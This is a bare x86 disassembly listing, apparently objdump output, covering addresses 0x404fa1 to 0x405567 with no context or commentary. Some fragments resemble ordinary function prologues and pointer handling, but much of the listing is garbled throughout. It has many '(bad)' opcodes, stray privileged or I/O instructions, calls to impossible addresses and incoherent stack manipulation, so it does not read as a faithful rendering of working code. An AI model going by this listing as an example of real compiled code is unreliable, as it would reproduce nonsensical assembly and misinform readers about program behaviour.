  404fa1:	ad                   	lods   %ds:(%esi),%eax
  404fa2:	00 3b                	add    %bh,(%ebx)
  404fa4:	c7                   	(bad)
  404fa5:	db 57 8b             	fistl  -0x75(%edi)
  404fa8:	9e                   	sahf
  404fa9:	0c 0f                	or     $0xf,%al
  404fab:	46                   	inc    %esi
  404fac:	74 06                	je     0x404fb4
  404fae:	50                   	push   %eax
  404faf:	29 1c 53             	sub    %ebx,(%ebx,%edx,2)
  404fb2:	b1 00                	mov    $0x0,%cl
  404fb4:	8b 73 18             	mov    0x18(%ebx),%esi
  404fb7:	8b 0b                	mov    (%ebx),%ecx
  404fb9:	8d 43 18             	lea    0x18(%ebx),%eax
  404fbc:	8b d7                	mov    %edi,%edx
  404fbe:	85 45 75             	test   %eax,0x75(%ebp)
  404fc1:	0f 3b                	(bad)
  404fc3:	be 73 0b 7c 70       	mov    $0x707c0b73,%esi
  404fc8:	68 83 c0 e0 42       	push   $0x42e0c083
  404fcd:	85 1f                	test   %ebx,(%edi)
  404fcf:	74 f1                	je     0x404fc2
  404fd1:	8b 30                	mov    (%eax),%esi
  404fd3:	85 f6                	test   %esi,%esi
  404fd5:	74 09                	je     0x404fe0
  404fd7:	8b f7                	mov    %edi,%esi
  404fd9:	85 bd 89 38 4f cb    	test   %edi,-0x34b0c777(%ebp)
  404fdf:	48                   	dec    %eax
  404fe0:	00 00                	add    %al,(%eax)
  404fe2:	00 3b                	add    %bh,(%ebx)
  404fe4:	d1 0f                	rorl   $1,(%edi)
  404fe6:	82 82 00 00 00 8b c2 	addb   $0xc2,-0x75000000(%edx)
  404fed:	fc                   	cld
  404fee:	83 e8 04             	sub    $0x4,%eax
  404ff1:	49                   	dec    %ecx
  404ff2:	85 d2                	test   %edx,%edx
  404ff4:	75 04                	jne    0x404ffa
  404ff6:	85 6a 77             	test   %ebp,0x77(%edx)
  404ff9:	f1                   	int1
  404ffa:	ee                   	out    %al,(%dx)
  404ffb:	0b 50 6f             	or     0x6f(%eax),%edx
  404ffe:	8b a5 14 8d fb 14    	mov    0x14fb8d14(%ebp),%esp
  405004:	04 9e                	add    $0x9e,%al
  405006:	74 80                	je     0x404f88
  405008:	7f 43                	jg     0x40504d
  40500a:	0c 85                	or     $0x85,%al
  40500c:	c0 74 06 07 e8       	shlb   $0xe8,0x7(%esi,%eax,1)
  405011:	bb 52 00 00 8b       	mov    $0x8b000052,%ebx
  405016:	c6                   	(bad)
  405017:	8b 94 85 f6 b2 0d 39 	mov    0x390db2f6(%ebp,%eax,4),%edx
  40501e:	7e 08                	jle    0x405028
  405020:	73 47                	jae    0x405069
  405022:	94                   	xchg   %eax,%esp
  405023:	28 0c 36             	sub    %cl,(%esi,%esi,1)
  405026:	85 f6                	test   %esi,%esi
  405028:	75 f3                	jne    0x40501d
  40502a:	8b 43 0c             	mov    0xc(%ebx),%eax
  40502d:	2a c0                	sub    %al,%al
  40502f:	34 a5                	xor    $0xa5,%al
  405031:	50                   	push   %eax
  405032:	18 09                	sbb    %cl,(%ecx)
  405034:	9b                   	fwait
  405035:	00 00                	add    %al,(%eax)
  405037:	68 00 20 00 00       	push   $0x2000
  40503c:	b9 91 5c 24 40       	mov    $0x40245c91,%ecx
  405041:	00 8b f0 83 f4 fc    	add    %cl,-0x30b7c10(%ebx)
  405047:	85 64 0f 84          	test   %esp,-0x7c(%edi,%ecx,1)
  40504b:	d9 00                	flds   (%eax)
  40504d:	00 00                	add    %al,(%eax)
  40504f:	6a 56                	push   $0x56
  405051:	d5 8d                	aad    $0x8d
  405053:	86 00                	xchg   %al,(%eax)
  405055:	f5                   	cmc
  405056:	00 5a c7             	add    %bl,-0x39(%edx)
  405059:	06                   	push   %es
  40505a:	00 00                	add    %al,(%eax)
  40505c:	f0 00 89 81 8f 89 56 	lock add %cl,0x56898f81(%ecx)
  405063:	10 89 46 cd a4 e4    	adc    %cl,-0x1b5b32ba(%ecx)
  405069:	8b 16                	mov    (%esi),%edx
  40506b:	89 10                	mov    %edx,(%eax)
  40506d:	4c                   	dec    %esp
  40506e:	7b 08                	jnp    0x405078
  405070:	8b 46 08             	mov    0x8(%esi),%eax
  405073:	03 f8                	add    %eax,%edi
  405075:	8b 43 04             	mov    0x4(%ebx),%eax
  405078:	8b cf                	mov    %edi,%ecx
  40507a:	89 81 08 3b c8 56    	mov    %eax,0x56c83b08(%ecx)
  405080:	03 89 43 08 8b 43    	add    0x438b0843(%ecx),%ecx
  405086:	0c 85                	or     $0x85,%al
  405088:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405089:	74 89                	je     0x405014
  40508b:	50                   	push   %eax
  40508c:	e8 af 0a 00 64       	call   0x64405b40
  405091:	8d 4e 18             	lea    0x18(%esi),%ecx
  405094:	c7 06 4a 00 00 4f    	movl   $0x4f00004a,(%esi)
  40509a:	89 4e 10             	mov    %ecx,0x10(%esi)
  40509d:	8b 7e 10             	mov    0x10(%esi),%edi
  4050a0:	5b                   	pop    %ebx
  4050a1:	4d                   	dec    %ebp
  4050a2:	10 89 36 89 63 04    	adc    %cl,0x4638936(%ecx)
  4050a8:	ff                   	ljmp   (bad)
  4050a9:	e8 40 89 dc 34       	call   0x351cd9ee
  4050ae:	89 46 10             	mov    %eax,0x10(%esi)
  4050b1:	89 9b 18 8b 42 0c    	mov    %ebx,0xc428b18(%ebx)
  4050b7:	20 77 30             	and    %dh,0x30(%edi)
  4050ba:	89 61 2c             	mov    %esp,0x2c(%ecx)
  4050bd:	e8 5e 89 4f 20       	call   0x208fda20
  4050c2:	0b ec                	or     %esp,%ebp
  4050c4:	89 57 04             	mov    %edx,0x4(%edi)
  4050c7:	89 14 00             	mov    %edx,(%eax,%eax,1)
  4050ca:	89 77 14             	mov    %esi,0x14(%edi)
  4050cd:	26 77 38             	es ja  0x405108
  4050d0:	78 77                	js     0x405149
  4050d2:	3c 89                	cmp    $0x89,%al
  4050d4:	77 1c                	ja     0x4050f2
  4050d6:	89 6c 24 89          	mov    %ebp,-0x77(%esp)
  4050da:	78 21                	js     0x4050fd
  4050dc:	89 1f                	mov    %ebx,(%edi)
  4050de:	74 60                	je     0x405140
  4050e0:	8b 53 18             	mov    0x18(%ebx),%edx
  4050e3:	52                   	push   %edx
  4050e4:	e8 30 14 c4 ff       	call   0x46519
  4050e9:	3b c6                	cmp    %esi,%eax
  4050eb:	89 45 10             	mov    %eax,0x10(%ebp)
  4050ee:	74 09                	je     0x4050f9
  4050f0:	50                   	push   %eax
  4050f1:	e8 da ff 00 00       	call   0x4150d0
  4050f6:	8b 45 10             	mov    0x10(%ebp),%eax
  4050f9:	06                   	push   %es
  4050fa:	4b                   	dec    %ebx
  4050fb:	04 22                	add    $0x22,%al
  4050fd:	c3                   	ret
  4050fe:	04 8d                	add    $0x8d,%al
  405100:	57                   	push   %edi
  405101:	08 3b                	or     %bh,(%ebx)
  405103:	a8 89                	test   $0x89,%al
  405105:	0a 74 46 89          	or     -0x77(%esi,%eax,2),%dh
  405109:	51                   	push   %ecx
  40510a:	0c 89                	or     $0x89,%al
  40510c:	7f b7                	jg     0x4050c5
  40510e:	c6                   	(bad)
  40510f:	89 5f 0c             	mov    %ebx,0xc(%edi)
  405112:	74 34                	je     0x405148
  405114:	ac                   	lods   %ds:(%esi),%al
  405115:	e8 26 52 00 00       	call   0x40a340
  40511a:	8b 45 08             	mov    0x8(%ebp),%eax
  40511d:	89 38                	mov    %edi,(%eax)
  40511f:	5f                   	pop    %edi
  405120:	5e                   	pop    %esi
  405121:	33 5e 5b             	xor    0x5b(%esi),%ebx
  405124:	5d                   	pop    %ebp
  405125:	58                   	pop    %eax
  405126:	1b 00                	sbb    (%eax),%eax
  405128:	8b 45 51             	mov    0x51(%ebp),%eax
  40512b:	85 c0                	test   %eax,%eax
  40512d:	fa                   	cli
  40512e:	07                   	pop    %es
  40512f:	6a 0c                	push   $0xc
  405131:	ff d0                	call   *%eax
  405133:	83 c4 58             	add    $0x58,%esp
  405136:	5f                   	pop    %edi
  405137:	5e                   	pop    %esi
  405138:	b8 0c 92 65 00       	mov    $0x65920c,%eax
  40513d:	5b                   	pop    %ebx
  40513e:	5d                   	pop    %ebp
  40513f:	ac                   	lods   %ds:(%esi),%al
  405140:	10 00                	adc    %al,(%eax)
  405142:	89 77 08             	mov    %esi,0x8(%edi)
  405145:	89 77 0c             	mov    %esi,0xc(%edi)
  405148:	8b 45 08             	mov    0x8(%ebp),%eax
  40514b:	89 38                	mov    %edi,(%eax)
  40514d:	5f                   	pop    %edi
  40514e:	5e                   	pop    %esi
  40514f:	33 c0                	xor    %eax,%eax
  405151:	05 5d c2 68 77       	add    $0x7768c25d,%eax
  405156:	90                   	nop
  405157:	90                   	nop
  405158:	10 90 90 90 90 90    	adc    %dl,-0x6f6f6f70(%eax)
  40515e:	90                   	nop
  40515f:	90                   	nop
  405160:	55                   	push   %ebp
  405161:	b6 ec                	mov    $0xec,%dh
  405163:	83 ec 20             	sub    $0x20,%esp
  405166:	53                   	push   %ebx
  405167:	56                   	push   %esi
  405168:	f6 8b 7d 08 89 7d ec 	testb  $0xec,0x7d89087d(%ebx)
  40516f:	33 db                	xor    %ebx,%ebx
  405171:	22 47 3b             	and    0x3b(%edi),%al
  405174:	0c 45                	or     $0x45,%al
  405176:	e8 4b 48 10 89       	call   0x895099c6
  40517b:	4d                   	dec    %ebp
  40517c:	42                   	inc    %edx
  40517d:	8b 50 14             	mov    0x14(%eax),%edx
  405180:	4a                   	dec    %edx
  405181:	c6 45 f0 00          	movb   $0x0,-0x10(%ebp)
  405185:	ed                   	in     (%dx),%eax
  405186:	55                   	push   %ebp
  405187:	e4 89                	in     $0x89,%al
  405189:	5d                   	pop    %ebp
  40518a:	f4                   	hlt
  40518b:	8b e8                	mov    %eax,%ebp
  40518d:	10 8b 50 3e 3b ca    	adc    %cl,-0x35c4c1b0(%ebx)
  405193:	75 2a                	jne    0x4051bf
  405195:	8d 55 e0             	lea    -0x20(%ebp),%edx
  405198:	53                   	push   %ebx
  405199:	2e 2b 01             	sub    %cs:(%ecx),%eax
  40519c:	00 00                	add    %al,(%eax)
  40519e:	83 c4 de             	add    $0xffffffde,%esp
  4051a1:	83 f8 ff             	cmp    $0xffffffff,%eax
  4051a4:	75 19                	jne    0x4051bf
  4051a6:	8b 47 20             	mov    0x20(%edi),%eax
  4051a9:	3b c3                	cmp    %ebx,%eax
  4051ab:	31 3b                	xor    %edi,(%ebx)
  4051ad:	6a 0c                	push   $0xc
  4051af:	ff d0                	call   *%eax
  4051b1:	83 c4 04             	add    $0x4,%esp
  4051b4:	33 c0                	xor    %eax,%eax
  4051b6:	5f                   	pop    %edi
  4051b7:	5e                   	pop    %esi
  4051b8:	5b                   	pop    %ebx
  4051b9:	8b e5                	mov    %ebp,%esp
  4051bb:	7d c2                	jge    0x40517f
  4051bd:	0c 00                	or     $0x0,%al
  4051bf:	8b 45 10             	mov    0x10(%ebp),%eax
  4051c2:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4051c5:	49                   	dec    %ecx
  4051c6:	8d 55 e0             	lea    -0x20(%ebp),%edx
  4051c9:	51                   	push   %ecx
  4051ca:	1b 7d 57             	sbb    0x57(%ebp),%edi
  4051cd:	53                   	push   %ebx
  4051ce:	40                   	inc    %eax
  4051cf:	00 e8                	add    %ch,%al
  4051d1:	fb                   	sti
  4051d2:	1e                   	push   %ds
  4051d3:	00 00                	add    %al,(%eax)
  4051d5:	83 f8 ff             	cmp    $0xffffffff,%eax
  4051d8:	75 19                	jne    0x4051f3
  4051da:	8b 47 20             	mov    0x20(%edi),%eax
  4051dd:	3b c3                	cmp    %ebx,%eax
  4051df:	6e                   	outsb  %ds:(%esi),(%dx)
  4051e0:	07                   	pop    %es
  4051e1:	ad                   	lods   %ds:(%esi),%eax
  4051e2:	0c ff                	or     $0xff,%al
  4051e4:	d0 83 c4 04 5f de    	rolb   $1,-0x21a0fb3c(%ebx)
  4051ea:	33 c0                	xor    %eax,%eax
  4051ec:	5b                   	pop    %ebx
  4051ed:	8b e5                	mov    %ebp,%esp
  4051ef:	5d                   	pop    %ebp
  4051f0:	c2 0c 00             	ret    $0xc
  4051f3:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4051f6:	c6 00 00             	movb   $0x0,(%eax)
  4051f9:	f1                   	int1
  4051fa:	4d                   	dec    %ebp
  4051fb:	88 2e                	mov    %ch,(%esi)
  4051fd:	51                   	push   %ecx
  4051fe:	10 2b                	adc    %ch,(%ebx)
  405200:	c2 28 55             	ret    $0x5528
  405203:	10 83 c0 08 b7 f8    	adc    %al,-0x748f740(%ebx)
  405209:	03 c2                	add    %edx,%eax
  40520b:	ae                   	scas   %es:(%edi),%al
  40520c:	41                   	inc    %ecx
  40520d:	b4 8b                	mov    $0x8b,%ah
  40520f:	df f4                	fcomip %st(4),%st
  405211:	3b 42 0f             	cmp    0xf(%edx),%eax
  405214:	84 a0 48 00 00 bf    	test   %ah,-0x40ffffb8(%eax)
  40521a:	7f 44                	jg     0x405260
  40521c:	f3 47                	repz inc %edi
  40521e:	30 85 c0 df 06 d4    	xor    %al,-0x2bf92040(%ebp)
  405224:	b1 7e                	mov    $0x7e,%cl
  405226:	50                   	push   %eax
  405227:	e5 00                	in     $0x0,%eax
  405229:	8b 46 04             	mov    0x4(%esi),%eax
  40522c:	26 0f 89 55 fc 8b 57 	es jns 0x57cc4e88
  405233:	70 7b                	jo     0x4052b0
  405235:	4d                   	dec    %ebp
  405236:	0c 8b                	or     $0x8b,%al
  405238:	06                   	push   %es
  405239:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40523c:	4f                   	dec    %edi
  40523d:	45                   	inc    %ebp
  40523e:	d5 55                	aad    $0x55
  405240:	8a 08                	mov    (%eax),%cl
  405242:	85 c9                	test   %ecx,%ecx
  405244:	79 0a                	jns    0x405250
  405246:	3b c2                	cmp    %edx,%eax
  405248:	76 06                	jbe    0x405250
  40524a:	89 1e                	mov    %ebx,(%esi)
  40524c:	8b a9 eb 6a 83 f8    	mov    -0x77c9515(%ecx),%ebp
  405252:	14 73                	adc    $0x73,%al
  405254:	04 90                	add    $0x90,%al
  405256:	4c                   	dec    %esp
  405257:	87 14 85 c9 89 0e 75 	xchg   %edx,0x750e89c9(,%eax,4)
  40525e:	ad                   	lods   %ds:(%esi),%eax
  40525f:	3b d0                	cmp    %eax,%edx
  405261:	0c 76                	or     $0x76,%al
  405263:	03 89 45 0c 89 74    	add    0x74890c45(%ecx),%ecx
  405269:	87 6f eb             	xchg   %ebp,-0x15(%edi)
  40526c:	08 8b bf 14 89 0e    	or     %cl,0xe8914bf(%ebx)
  405272:	89 77 24             	mov    %esi,0x24(%edi)
  405275:	3b c6                	cmp    %esi,%eax
  405277:	de 04 2b             	fiadds (%ebx,%ebp,1)
  40527a:	d0 eb                	shr    $1,%bl
  40527c:	dd 33                	fnsave (%ebx)
  40527e:	d2 3f                	sarb   %cl,(%edi)
  405280:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405281:	f8                   	clc
  405282:	85 f6                	test   %esi,%esi
  405284:	75 b1                	jne    0x405237
  405286:	8b 1e                	mov    (%esi),%ebx
  405288:	0c 89                	or     $0x89,%al
  40528a:	57                   	push   %edi
  40528b:	08 89 07 8b 38 56    	or     %cl,0x56388b07(%ecx)
  405291:	85 ff                	test   %edi,%edi
  405293:	74 06                	je     0x40529b
  405295:	57                   	push   %edi
  405296:	4e                   	dec    %esi
  405297:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405298:	50                   	push   %eax
  405299:	00 19                	add    %bl,(%ecx)
  40529b:	85 db                	test   %ebx,%ebx
  40529d:	a3 14 8b 35 53       	mov    %eax,0x53358b14
  4052a2:	c1 40 00 8b          	roll   $0x8b,0x0(%eax)
  4052a6:	c3                   	ret
  4052a7:	8b 1b                	mov    (%ebx),%ebx
  4052a9:	ac                   	lods   %ds:(%esi),%al
  4052aa:	ff d6                	call   *%esi
  4052ac:	83 c4 04             	add    $0x4,%esp
  4052af:	85 db                	test   %ebx,%ebx
  4052b1:	75 f2                	jne    0x4052a5
  4052b3:	ce                   	into
  4052b4:	55                   	push   %ebp
  4052b5:	10 8b 7d 08 8a 45    	adc    %cl,0x458a087d(%ebx)
  4052bb:	f0 84 23             	lock test %ah,(%ebx)
  4052be:	75 0b                	jne    0x4052cb
  4052c0:	5f                   	pop    %edi
  4052c1:	5e                   	pop    %esi
  4052c2:	8b c2                	mov    %edx,%eax
  4052c4:	5b                   	pop    %ebx
  4052c5:	8b 4a 5d             	mov    0x5d(%edx),%ecx
  4052c8:	c2 0c 00             	ret    $0xc
  4052cb:	8a e3                	mov    %bl,%ah
  4052cd:	e8 8b c7 2c c7       	call   0xc76d1a5d
  4052d2:	41                   	inc    %ecx
  4052d3:	49                   	dec    %ecx
  4052d4:	00 00                	add    %al,(%eax)
  4052d6:	00 00                	add    %al,(%eax)
  4052d8:	56                   	push   %esi
  4052d9:	d4 04                	aam    $0x4
  4052db:	a1 23 04 89 0a       	mov    0xa890423,%eax
  4052e0:	89 1b                	mov    %ebx,(%ebx)
  4052e2:	89 48 04             	mov    %ecx,0x4(%eax)
  4052e5:	89 4f 2c             	mov    %ecx,0x2c(%edi)
  4052e8:	8b 48 ac             	mov    -0x54(%eax),%ecx
  4052eb:	8b 58 10             	mov    0x10(%eax),%ebx
  4052ee:	8b 0f                	mov    (%edi),%ecx
  4052f0:	2b cb                	sub    %ebx,%ecx
  4052f2:	81 c1 00 58 00 00    	add    $0x5800,%ecx
  4052f8:	8b d6                	mov    %esi,%edx
  4052fa:	81 e1 00 f0 ff ff    	and    $0xfffff000,%ecx
  405300:	49                   	dec    %ecx
  405301:	c1 f9 47             	sar    $0x47,%ecx
  405304:	89 48 0c             	mov    %ecx,0xc(%eax)
  405307:	8b b4 0c 81 cf 5e 80 	mov    -0x7fa1307f(%esp,%ecx,1),%esi
  40530e:	0d 12 3b 4a 0c       	or     $0xc4a3b12,%eax
  405313:	72 f9                	jb     0x40530e
  405315:	8b 48 04             	mov    0x4(%eax),%ecx
  405318:	94                   	xchg   %eax,%esp
  405319:	31 8b 08 8b 70 04    	xor    %ecx,0x4708b08(%ebx)
  40531f:	89 71 7b             	mov    %esi,0x7b(%ecx)
  405322:	4b                   	dec    %ebx
  405323:	4a                   	dec    %edx
  405324:	01 89 3d 04 89 01    	add    %ecx,0x189043d(%ecx)
  40532a:	89 64 51 42          	mov    %esp,0x42(%ecx,%edx,2)
  40532e:	04 8b                	add    $0x8b,%al
  405330:	93                   	xchg   %eax,%ebx
  405331:	10 5f d9             	adc    %bl,-0x27(%edi)
  405334:	5b                   	pop    %ebx
  405335:	8b e5                	mov    %ebp,%esp
  405337:	5d                   	pop    %ebp
  405338:	c2 0c 00             	ret    $0xc
  40533b:	90                   	nop
  40533c:	90                   	nop
  40533d:	90                   	nop
  40533e:	90                   	nop
  40533f:	90                   	nop
  405340:	55                   	push   %ebp
  405341:	8b ec                	mov    %esp,%ebp
  405343:	83 ec 10             	sub    $0x10,%esp
  405346:	8b 55 08             	mov    0x8(%ebp),%edx
  405349:	53                   	push   %ebx
  40534a:	56                   	push   %esi
  40534b:	57                   	push   %edi
  40534c:	8b 5a 08             	mov    0x8(%edx),%ebx
  40534f:	8b 02                	mov    (%edx),%eax
  405351:	8b d4                	mov    %esp,%edx
  405353:	0c 2b                	or     $0x2b,%al
  405355:	43                   	inc    %ebx
  405356:	10 b4 03 f6 8d b9 00 	adc    %dh,0xb98df6(%ebx,%eax,1)
  40535d:	83 f9 20             	cmp    $0x20,%ecx
  405360:	73 05                	jae    0x405367
  405362:	b9 bc 00 00 47       	mov    $0x470000bc,%ecx
  405367:	80 7a 10 f8          	cmpb   $0xf8,0x10(%edx)
  40536b:	8b 27                	mov    (%edi),%esp
  40536d:	75 7b                	jne    0x4053ea
  40536f:	8b 24 c9             	mov    (%ecx,%ecx,8),%esp
  405372:	97                   	xchg   %eax,%edi
  405373:	70 10                	jo     0x405385
  405375:	3b ce                	cmp    %esi,%ecx
  405377:	d4 fd                	aam    $0xfd
  405379:	8b 48 4c             	mov    0x4c(%eax),%ecx
  40537c:	aa                   	stos   %al,%es:(%edi)
  40537d:	30 c2                	xor    %al,%dl
  40537f:	31 8b 08 8b 70 04    	xor    %ecx,0x4708b08(%ebx)
  405385:	89 71 04             	mov    %esi,0x4(%ecx)
  405388:	8b 4b 2a             	mov    0x2a(%ebx),%ecx
  40538b:	89 48 04             	mov    %ecx,0x4(%eax)
  40538e:	ae                   	scas   %es:(%edi),%al
  40538f:	01 6f 18             	add    %ebp,0x18(%edi)
  405392:	89 43 4a             	mov    %eax,0x4a(%ebx)
  405395:	cb                   	lret
  405396:	57                   	push   %edi
  405397:	05 56 00 da 00       	add    $0xda0056,%eax
  40539c:	89 47 19             	mov    %eax,0x19(%edi)
  40539f:	8b 43 14             	mov    0x14(%ebx),%eax
  4053a2:	8b 4b 10             	mov    0x10(%ebx),%ecx
  4053a5:	8b 33                	mov    (%ebx),%esi
  4053a7:	2b c1                	sub    %ecx,%eax
  4053a9:	8b ce                	mov    %esi,%ecx
  4053ab:	c7                   	(bad)
  4053ac:	ed                   	in     (%dx),%eax
  4053ad:	10 00                	adc    %al,(%eax)
  4053af:	bf 8a 00 f0 ff       	mov    $0xfff0008a,%edi
  4053b4:	ff 74 c1 f8          	push   -0x8(%ecx,%eax,8)
  4053b8:	0c 89                	or     $0x89,%al
  4053ba:	66 0c 3b             	data16 or $0x3b,%al
  4053bd:	41                   	inc    %ecx
  4053be:	0c 73                	or     $0x73,%al
  4053c0:	49                   	dec    %ecx
  4053c1:	8b 09                	mov    (%ecx),%ecx
  4053c3:	3b ba 0c 72 f9 8b    	cmp    -0x74068df4(%edx),%edi
  4053c9:	43                   	inc    %ebx
  4053ca:	04 89                	add    $0x89,%al
  4053cc:	30 cb                	xor    %cl,%bl
  4053ce:	03 8b 73 04 89 c6    	add    -0x3976fb8d(%ebx),%ecx
  4053d4:	c6                   	(bad)
  4053d5:	8b 41 04             	mov    0x4(%ecx),%eax
  4053d8:	89 43 04             	mov    %eax,0x4(%ebx)
  4053db:	89 df                	mov    %ebx,%edi
  4053dd:	aa                   	stos   %al,%es:(%edi)
  4053de:	0b 89 59 04 74 2e    	or     0x2e740459(%ecx),%ecx
  4053e4:	2c e9                	sub    $0xe9,%al
  4053e6:	c4 4c 00 6b          	les    0x6b(%eax,%eax,1),%ecx
  4053ea:	8b 77 8c             	mov    -0x74(%edi),%esi
  4053ed:	f5                   	cmc
  4053ee:	81 17 10 00 00 25    	adcl   $0x25000010,(%edi)
  4053f4:	00 f0                	add    %dh,%al
  4053f6:	ff                   	(bad)
  4053f7:	ff                   	(bad)
  4053f8:	3b c1                	cmp    %ecx,%eax
  4053fa:	ec                   	in     (%dx),%al
  4053fb:	45                   	inc    %ebp
  4053fc:	56                   	push   %esi
  4053fd:	f8                   	clc
  4053fe:	82 bd 3c 00 00 3d bd 	cmpb   $0xbd,0x3d00003c(%ebp)
  405405:	20 00                	and    %al,(%eax)
  405407:	00 b0 0a c7 45 fc    	add    %dh,-0x3ba38f6(%eax)
  40540d:	57                   	push   %edi
  40540e:	20 00                	and    %al,(%eax)
  405410:	00 8b 45 fc 30 e0    	add    %cl,-0x1fcf03bb(%ebx)
  405416:	9e                   	sahf
  405417:	b9 0c d1 58 ff       	mov    $0xff58d10c,%ecx
  40541c:	ff 89 7d f8 1a 87    	decl   -0x78e50783(%ecx)
  405422:	75 01                	jne    0x405425
  405424:	00 39                	add    %bh,(%ecx)
  405426:	3b 3e                	cmp    (%esi),%edi
  405428:	0f 87 a9 00 67 00    	ja     0xa754d7
  40542e:	8b 6a 0c             	mov    0xc(%edx),%ebp
  405431:	85 c0                	test   %eax,%eax
  405433:	74 06                	je     0x40543b
  405435:	50                   	push   %eax
  405436:	e8 95 4e 00 00       	call   0x40a2d0
  40543b:	83 7c 46 14 00       	cmpl   $0x0,0x14(%esi,%eax,2)
  405440:	8b 0e                	mov    (%esi),%ecx
  405442:	8d 44 be 14          	lea    0x14(%esi,%edi,4),%eax
  405446:	8b 66 31             	mov    0x31(%esi),%esp
  405449:	55                   	push   %ebp
  40544a:	f8                   	clc
  40544b:	75 10                	jne    0x40545d
  40544d:	5e                   	pop    %esi
  40544e:	d1 73 09             	shll   $1,0x9(%ebx)
  405451:	83 c0 3c             	add    $0x3c,%eax
  405454:	42                   	inc    %edx
  405455:	83 38 00             	cmpl   $0x0,(%eax)
  405458:	b1 b3                	mov    $0xb3,%cl
  40545a:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40545d:	8b 10                	mov    (%eax),%edx
  40545f:	39 d2                	cmp    %edx,%edx
  405461:	89 55 f0             	mov    %edx,-0x10(%ebp)
  405464:	0f 84 9c 00 6d 00    	je     0xad5506
  40546a:	8b 3a                	mov    (%edx),%edi
  40546c:	85 3f                	test   %edi,(%edi)
  40546e:	89 38                	mov    %edi,(%eax)
  405470:	75 16                	jne    0x405488
  405472:	39 4d 5c             	cmp    %ecx,0x5c(%ebp)
  405475:	27                   	daa
  405476:	11 8b 78 54 83 e8    	adc    %ecx,-0x177cab88(%ebx)
  40547c:	04 f9                	add    $0xf9,%al
  40547e:	6c                   	insb   (%dx),%es:(%edi)
  40547f:	ff a7 04 56 c9 77    	jmp    *0x77c95604(%edi)
  405485:	f1                   	int1
  405486:	89 cb                	mov    %ecx,%ebx
  405488:	8b 4a 70             	mov    0x70(%edx),%ecx
  40548b:	8b 46 08             	mov    0x8(%esi),%eax
  40548e:	03 13                	add    (%ebx),%edx
  405490:	51                   	push   %ecx
  405491:	46                   	inc    %esi
  405492:	08 8b c8 8b 46 04    	or     %cl,0x4468bc8(%ebx)
  405498:	3b c8                	cmp    %eax,%ecx
  40549a:	76 03                	jbe    0x40549f
  40549c:	5c                   	pop    %esp
  40549d:	46                   	inc    %esi
  40549e:	08 8b 76 7c e8 f6    	or     %cl,-0x917838a(%ebx)
  4054a4:	74 22                	je     0x4054c8
  4054a6:	56                   	push   %esi
  4054a7:	e8 94 96 00 00       	call   0x40eb40
  4054ac:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4054af:	8d 42 6f             	lea    0x6f(%edx),%eax
  4054b2:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  4054b8:	ca 42 10             	lret   $0x1042
  4054bb:	26 1d 8b 90 08 8a    	es sbb $0x8a08908b,%eax
  4054c1:	4a                   	dec    %edx
  4054c2:	9f                   	lahf
  4054c3:	84 f9                	test   %bh,%cl
  4054c5:	74 08                	je     0x4054cf
  4054c7:	8b db                	mov    %ebx,%ebx
  4054c9:	14 b0                	adc    $0xb0,%al
  4054cb:	0b 89 5a 14 70 42    	or     0x4270145a(%ecx),%ecx
  4054d1:	10 01                	adc    %al,(%ecx)
  4054d3:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  4054d6:	8b 73 ed             	mov    -0x13(%ebx),%esi
  4054d9:	15 78 10 a8 d9       	adc    $0xd9a81078,%eax
  4054de:	c1 e9 02             	shr    $0x2,%ecx
  4054e1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4054e3:	8b fc                	mov    %esp,%edi
  4054e5:	83 e1 03             	and    $0x3,%ecx
  4054e8:	a2 a4 89 42 08       	mov    %al,0x84289a4
  4054ed:	8b 48 74             	mov    0x74(%eax),%ecx
  4054f0:	8b f3                	mov    %ebx,%esi
  4054f2:	5f                   	pop    %edi
  4054f3:	03 c1                	add    %ecx,%eax
  4054f5:	5e                   	pop    %esi
  4054f6:	cb                   	lret
  4054f7:	54                   	push   %esp
  4054f8:	8b 40 14             	mov    0x14(%eax),%eax
  4054fb:	48                   	dec    %eax
  4054fc:	7c 0b                	jl     0x405509
  4054fe:	42                   	inc    %edx
  4054ff:	04 33                	add    $0x33,%al
  405501:	c0 8b e5 5d a4 3a 76 	rorb   $0x76,0x3aa45de5(%ebx)
  405508:	0c 85                	or     $0x85,%al
  40550a:	f6 74 49 bf          	divb   -0x41(%ecx,%ecx,2)
  40550e:	e8 2d 4e 00 24       	call   0x2440a340
  405513:	eb 41                	jmp    0x405556
  405515:	db 4e 14             	fisttpl 0x14(%esi)
  405518:	b4 c9                	mov    $0xc9,%ah
  40551a:	74 3d                	je     0x405559
  40551c:	8b 57 0c             	mov    0xc(%edi),%edx
  40551f:	85 a8 f0 09 50 c4    	test   %ebp,-0x3baff610(%eax)
  405525:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405526:	4d                   	dec    %ebp
  405527:	00 00                	add    %al,(%eax)
  405529:	8b a5 60 e3 7e 14    	mov    0x147ee360(%ebp),%esp
  40552f:	8d 93 be 85 ec 74    	lea    0x74ec85be(%ebx),%edx
  405535:	10 8b 4d f8 3b 4f    	adc    %cl,0x4f3bf84d(%ebx)
  40553b:	08 76 46             	or     %dh,0x46(%esi)
  40553e:	8b fb                	mov    %ebx,%edi
  405540:	8b 3f                	mov    (%edi),%edi
  405542:	45                   	inc    %ebp
  405543:	ff 75 f0             	push   -0x10(%ebp)
  405546:	8b 76 0c             	mov    0xc(%esi),%esi
  405549:	32 f6                	xor    %dh,%dh
  40554b:	23 06                	and    (%esi),%eax
  40554d:	56                   	push   %esi
  40554e:	e8 ed 4d 00 00       	call   0x40a340
  405553:	8b 4b f8             	mov    -0x8(%ebx),%ecx
  405556:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405559:	50                   	push   %eax
  40555a:	ff e4                	jmp    *%esp
  40555c:	5c                   	pop    %esp
  40555d:	db 40 00             	fildl  0x0(%eax)
  405560:	83 8a 04 85 c0 e8 59 	orl    $0x59,-0x173f7afc(%edx)
  405567:	8b 4d ba             	mov    -0x46(%ebp),%ecx
